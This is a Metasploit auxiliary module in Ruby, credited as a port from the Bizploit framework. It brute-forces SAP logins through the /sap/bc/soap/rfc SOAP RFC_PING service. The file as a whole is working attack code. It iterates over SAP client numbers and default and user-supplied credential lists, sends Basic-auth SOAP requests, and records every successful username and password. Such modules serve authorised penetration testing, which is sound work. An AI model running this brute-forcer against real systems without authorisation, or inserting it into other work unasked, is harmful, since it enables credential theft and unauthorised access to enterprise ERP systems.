##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute

	def initialize
		super(
			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_PING Login Brute Forcer',
			'Description' => %q{
				This module attempts to brute force SAP username and passwords through the
				/sap/bc/soap/rfc SOAP service, using RFC_PING function. Default clients can be
				tested without needing to set a CLIENT. Common/Default user and password
				combinations can be tested just setting DEFAULT_CRED variable to true. These
				default combinations are stored in MSF_DATA_DIRECTORY/wordlists/sap_default.txt.
			},
			'References' =>
				[
					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
				],
			'Author' =>
				[
					'Agnivesh Sathasivam',
					'nmonkee'
				],
			'License' => MSF_LICENSE
		)
		register_options(
			[
				Opt::RPORT(8000),
				OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
				OptBool.new('DEFAULT_CRED',[false, 'Check using the defult password and username',true])
			], self.class)
	end

	def run_host(ip)
		if datastore['CLIENT'].nil?
			print_status("Using default SAP client list")
			client = ['000', '001', '066']
		else
			client = []
			if datastore['CLIENT'] =~ /^\d{3},/
				client = datastore['CLIENT'].split(/,/)
				print_status("Brute forcing clients #{datastore['CLIENT']}")
			elsif datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
				array = datastore['CLIENT'].split(/-/)
				client = (array.at(0)..array.at(1)).to_a
				print_status("Brute forcing clients #{datastore['CLIENT']}")
			elsif datastore['CLIENT'] =~ /^\d{3}\z/
				client.push(datastore['CLIENT'])
				print_status("Brute forcing client #{datastore['CLIENT']}")
			else
				print_status("Invalid CLIENT - using default SAP client list instead")
				client = ['000', '001', '066']
			end
		end
		saptbl = Msf::Ui::Console::Table.new( Msf::Ui::Console::Table::Style::Default,
			'Header' => "[SAP] Credentials",
			'Prefix' => "\n",
			'Postfix' => "\n",
			'Indent'  => 1,
			'Columns' =>
				[
					"host",
					"port",
					"client",
					"user",
					"pass"
				])
		if datastore['DEFAULT_CRED']
			credentials = extract_word_pair(Msf::Config.data_directory + '/wordlists/sap_default.txt')
			credentials.each do |u, p|
				client.each do |cli|
					success = bruteforce(u, p, cli)
					if success
						saptbl << [ rhost, rport, cli, u, p]
					end
				end
			end
		end
		each_user_pass do |u, p|
			client.each do |cli|
				success = bruteforce(u, p, cli)
				if success
					saptbl << [ rhost, rport, cli, u, p]
				end
			end
		end
		print(saptbl.to_s)
	end

	def bruteforce(username,password,client)
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
		data << '<env:Body>'
		data << '<n1:RFC_PING xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
		data << '</n1:RFC_PING>'
		data << '</env:Body>'
		data << '</env:Envelope>'
		begin
			res = send_request_cgi({
				'uri' => '/sap/bc/soap/rfc?sap-client=' + client + '&sap-language=EN',
				'method' => 'POST',
				'data' => data,
				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + client,
				'ctype' => 'text/xml; charset=UTF-8',
				'authorization' => basic_auth(username, password),
				'headers' =>
					{
						'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
					}
			})
			if res and res.code == 200
				report_auth_info(
					:host => rhost,
					:port => rport,
					:sname => "sap",
					:proto => "tcp",
					:user => "#{username}",
					:pass => "#{password}",
					:proof => "SAP Client: #{client}",
					:active => true
				)
				return true
			end
		rescue ::Rex::ConnectionError
			print_error("[SAP] #{rhost}:#{rport} - Unable to connect")
			return false
		end
		return false
	end
end
